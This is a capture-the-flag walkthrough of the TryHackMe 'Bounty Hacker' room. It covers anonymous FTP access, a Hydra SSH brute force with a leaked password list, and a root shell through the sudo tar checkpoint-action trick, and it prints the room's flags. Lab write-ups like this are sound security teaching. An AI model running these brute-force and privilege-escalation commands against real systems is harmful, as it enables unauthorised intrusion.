# TryHackMe — Bounty Hacker

A walkthrough of the **Bounty Hacker** room on TryHackMe: pulling credentials off an anonymous FTP server, brute-forcing SSH with Hydra, and escalating to root through a passwordless `sudo tar` rule.

| | |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Bounty Hacker](https://tryhackme.com/room/cowboyhacker) |
| **Difficulty** | Easy |
| **Category** | Linux |
| **Author** | MuhammadAnasRah |
| **Target IP** | `10.130.153.193` |
| **Attack box** | Kali Linux |
| **Connection** | TryHackMe OpenVPN |

---

## Table of Contents

- [Objective](#objective)
- [Setup](#setup)
- [Reconnaissance & Enumeration](#reconnaissance--enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [References](#references)

---

## Objective

A Firefly-themed "bounty hunter" box: get a foothold through a misconfigured FTP server, crack SSH credentials with the files that server hands out for free, and escalate to root through an over-permissive sudo rule.

## Setup

Connected to TryHackMe's OpenVPN, then confirmed the target was reachable:

```bash
ping -c 4 10.130.153.193
```

```
PING 10.130.153.193 (10.130.153.193) 56(84) bytes of data.
64 bytes from 10.130.153.193: icmp_seq=1 ttl=62 time=140 ms
64 bytes from 10.130.153.193: icmp_seq=2 ttl=62 time=137 ms
64 bytes from 10.130.153.193: icmp_seq=3 ttl=62 time=137 ms
64 bytes from 10.130.153.193: icmp_seq=4 ttl=62 time=136 ms

--- 10.130.153.193 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
```

## Reconnaissance & Enumeration

### Service scan

```bash
nmap -sV 10.130.153.193
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

![Nmap service scan results](screenshots/01-nmap-scan.png)

Three ports, and the one that jumped out immediately was 21 — FTP is always worth checking for anonymous access before anything else, because "anonymous login enabled" is still shockingly common.

### FTP enumeration

```bash
ftp 10.130.153.193
```

```
Connected to 10.130.153.193.
220 (vsFTPd 3.0.5)
Name (10.130.153.193:dog): anonymous
230 Login successful.
```

Anonymous login worked without a password. Listing the directory turned up two files:

```
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

![Anonymous FTP login and directory listing](screenshots/02-ftp-anonymous-login.png)

FTP's command set is limited — it's not a shell, so `cat` and `nano` don't work inside the FTP prompt itself. Pulled both files down locally with `get` instead:

```
ftp> get locks.txt
ftp> get task.txt
```

### Reading the loot

```bash
cat task.txt
```

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Signed off `-lin` — that's the username, handed over for free.

```bash
cat locks.txt
```

A list of roughly two dozen password variations, all built around the same two words — `Dragon` and `Syndicate` — with different capitalization, leetspeak substitutions, and symbol swaps (`ReddrAGON`, `R3dDRaG0nSynd1c4te`, `REddragOn$ynD1c47e`, and so on). Clearly a human-generated "clever" password list rather than a generic one, which made it a perfect candidate for a targeted brute force rather than something like rockyou.

![locks.txt and task.txt contents](screenshots/03-locks-task-files.png)

## Exploitation

With a username (`lin`) and a small, targeted password list (`locks.txt`), SSH was the obvious next target:

```bash
hydra -l lin -P locks.txt ssh://10.130.153.193
```

```
[DATA] attacking ssh://10.130.153.193:22/
[22][ssh] host: 10.130.153.193   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Cracked on the first pass — the list was small enough, and specific enough to the target, that Hydra didn't need long.

```bash
ssh lin@10.130.153.193
```

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
```

![Hydra cracking the SSH password and logging in as lin](screenshots/04-hydra-ssh-crack-login.png)

In, as `lin`. First stop: the user flag.

```
lin@ip-10-130-153-193:~$ cd Desktop/
lin@ip-10-130-153-193:~/Desktop$ ls
user.txt
lin@ip-10-130-153-193:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

![User flag and sudo -l output](screenshots/05-user-flag-sudo-l.png)

## Privilege Escalation

Standard first move on any new foothold — check what the account can run as root:

```bash
sudo -l
```

```
User lin may run the following commands on ip-10-130-153-193:
    (root) /bin/tar
```

Unrestricted `sudo` access to `/bin/tar`. My first instinct was to try `sudo su -` directly, which — correctly — got refused:

```
$ sudo su -
Sorry, user lin is not allowed to execute '/bin/su -' as root on ip-10-130-153-193.eu-west-3.compute.internal.
```

`tar` was the only binary actually granted, so that's the one to abuse. [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) documents exactly this escape — `tar` supports a `--checkpoint-action` flag that can be made to execute an arbitrary command mid-archive, and since the whole process is running under `sudo`, that command inherits root:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
tar: Removing leading `/' from member names
# whoami
root
```

<img width="1718" height="878" alt="06-gtfobins-tar-root-flag" src="https://github.com/user-attachments/assets/ef573255-de59-42f6-817f-a5113aa0fa24" />


From the new root shell, finding the root flag was a simple search:

```
# id
uid=0(root) gid=0(root) groups=0(root)
# find / -name "root.txt" 2>/dev/null
/root/root.txt
# cd /root
# ls
root.txt  snap
# cat root.txt
THM{80UN7Y_h4cK3r}
```

## Flags

| Flag | Location | Value | Status |
|---|---|---|---|
| User flag | `~/Desktop/user.txt` | `THM{CR1M3_SyNd1C4T3}` | ✅ Captured |
| Root flag | `/root/root.txt` | `THM{80UN7Y_h4cK3r}` | ✅ Captured |

## Key Takeaways

- **Anonymous FTP is still a live attack surface.** A server that accepts `anonymous`/blank-password logins will often just hand over files — in this case, literally a username and a tailored password list. No exploit required, just checking whether the door was ever locked.
- **A "clever" password scheme is still a weak one if it's predictable.** Every password in `locks.txt` followed the same `Dragon` + `Syndicate` theme with minor substitutions. That pattern is exactly what makes a targeted wordlist attack so much faster than a generic one — once you've seen three or four variants, Hydra can usually find the rest.
- **`sudo -l` is non-negotiable on a new shell.** It immediately told me which single binary (`tar`) was going to be the path to root, with no guessing involved.
- **GTFOBins is the reference, not the workaround.** `tar`, like `vim`, `find`, and a long list of other everyday Linux utilities, has a documented way to spawn a shell when it's run with elevated privileges it shouldn't have. Recognizing a binary on that list is now one of the first things I check during privilege escalation.

## Tools Used

- [Nmap](https://nmap.org/) — service enumeration
- FTP (anonymous login) — initial file disclosure
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) — SSH password brute force
- [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) — privilege escalation reference for the `tar` sudo rule

## References

- [TryHackMe — Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)

---

